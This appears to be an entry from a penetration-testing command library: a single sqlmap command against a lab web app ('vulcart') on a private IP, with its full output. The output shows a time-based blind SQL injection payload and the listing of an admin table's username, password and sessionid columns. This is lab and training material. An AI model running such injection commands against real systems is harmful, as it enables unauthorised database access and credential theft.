---
id: af0e3e66-5fa6-4bb9-9668-793bc6c1830d
name: SQLMap to Dump Column Names
type: command
executor: ''
data: sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails
  --columns
output: "        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.2.7#stable}\n|_\
  \ -| . [)]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V          |_|  \
  \ http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets\
  \ without prior mutual consent is illegal. It is the end user's responsibility to\
  \ obey all applicable local, state and federal laws. Developers assume no liability\
  \ and are not responsible for any misuse or damage caused by this program\n\n[*]\
  \ starting at 23:56:48\n\n[23:56:48] [WARNING] provided value for parameter 'term'\
  \ is empty. Please, always use only valid parameter values so sqlmap could be able\
  \ to run properly\n[23:56:48] [INFO] resuming back-end DBMS 'mysql' \n[23:56:48]\
  \ [INFO] testing connection to the target URL\nsqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'.\
  \ Do you want to follow? [Y/n] y\nsqlmap resumed the following injection point(s)\
  \ from stored session:\n---\nParameter: term (GET)\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: term=%' AND\
  \ SLEEP(5) AND '%'='\n---\n[23:56:50] [INFO] the back-end DBMS is MySQL\nweb application\
  \ technology: Apache 2.4.41, PHP 7.1.32\nback-end DBMS: MySQL >= 5.0.12\n[23:56:50]\
  \ [INFO] fetching columns for table 'admindetails' in database 'vulcart'\n[23:56:50]\
  \ [INFO] resumed: 3\n[23:56:50] [INFO] resumed: username\n[23:56:50] [WARNING] time-based\
  \ comparison requires larger statistical model, please wait..............................\
  \ (done)                         \ndo you want sqlmap to try to optimize value(s)\
  \ for DBMS delay responses (option '--time-sec')? [Y/n] y\n[23:57:07] [WARNING]\
  \ it is very important to not stress the network connection during usage of time-based\
  \ payloads to prevent potential disruptions \n[23:57:27] [INFO] adjusting time delay\
  \ to 1 second due to good response times\nvarchar(50)\n[23:58:31] [INFO] resumed:\
  \ password\n[23:58:31] [INFO] retrieved: varchar(50)\n[23:59:41] [INFO] resumed:\
  \ sessionid\n[23:59:41] [INFO] retrieved: varchar(150)\nDatabase: vulcart\nTable:\
  \ admindetails\n[3 columns]\n+-----------+--------------+\n| Column    | Type  \
  \       |\n+-----------+--------------+\n| password  | varchar(50)  |\n| sessionid\
  \ | varchar(150) |\n| username  | varchar(50)  |\n+-----------+--------------+\n\
  \n[00:00:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.43.68'\n\
  \n[*] shutting down at 00:00:54\n"
created_at: '2020-08-19T18:56:34.610612+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap to Dump Column Names

```bash
sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails --columns
```

## Expected Output

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.7#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:56:48

[23:56:48] [WARNING] provided value for parameter 'term' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[23:56:48] [INFO] resuming back-end DBMS 'mysql' 
[23:56:48] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: term=%' AND SLEEP(5) AND '%'='
---
[23:56:50] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0.12
[23:56:50] [INFO] fetching columns for table 'admindetails' in database 'vulcart'
[23:56:50] [INFO] resumed: 3
[23:56:50] [INFO] resumed: username
[23:56:50] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                         
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[23:57:07] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[23:57:27] [INFO] adjusting time delay to 1 second due to good response times
varchar(50)
[23:58:31] [INFO] resumed: password
[23:58:31] [INFO] retrieved: varchar(50)
[23:59:41] [INFO] resumed: sessionid
[23:59:41] [INFO] retrieved: varchar(150)
Database: vulcart
Table: admindetails
[3 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| password  | varchar(50)  |
| sessionid | varchar(150) |
| username  | varchar(50)  |
+-----------+--------------+

[00:00:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.43.68'

[*] shutting down at 00:00:54

```
